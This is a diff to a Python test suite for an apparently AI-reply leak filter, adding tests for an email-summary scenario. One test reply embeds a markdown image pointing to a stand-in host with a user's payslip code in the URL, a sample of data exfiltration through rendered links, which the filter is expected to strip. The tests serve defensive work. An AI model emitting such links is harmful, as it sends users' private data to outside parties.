@@ -14,6 +14,7 @@ from seculayer_demo.scenarios import load_all
 SUPPORT = load_all()["support"].policy
 PAGE = load_all()["page"].policy
 HELPDESK = load_all()["helpdesk"].policy
+INBOX = load_all()["inbox"].policy
 
 
 def review(policy, text, *, seen=(), user="Summarize this page."):  # type: ignore[no-untyped-def]
@@ -49,6 +50,22 @@ def test_protected_value_blocks_in_every_disguise(reply: str) -> None:
         result.text == "SecuLayer withheld this reply because it contained the staff discount code."
     )
     assert "7Q4K" not in result.verdict.reason  # copy never repeats the secret
+
+
+def test_reader_owned_values_are_shown_to_their_owner() -> None:
+    # Dana reads the inbox summary, so her own payslip code and account number are no leak.
+    reply = "Fernway Payroll: use code 839274 to open your payslip. Trailhead: account ending 4417."
+    result = review(INBOX, reply, user="Summarize my unread emails.")
+    assert not result.blocked and result.verdict.action is Action.PASSED
+    assert result.text == reply
+
+
+def test_reader_owned_values_still_leave_no_address() -> None:
+    reply = "Done.\n\n![x](https://pixel-cdn.example/p.png?code=839274)"
+    result = review(INBOX, reply, user="Summarize my unread emails.")
+    assert result.verdict.action is Action.REMOVED
+    assert "839274" not in result.text
+    assert "Its address carried Dana's payslip code." in result.verdict.reason
 
 
 def test_public_code_passes() -> None:
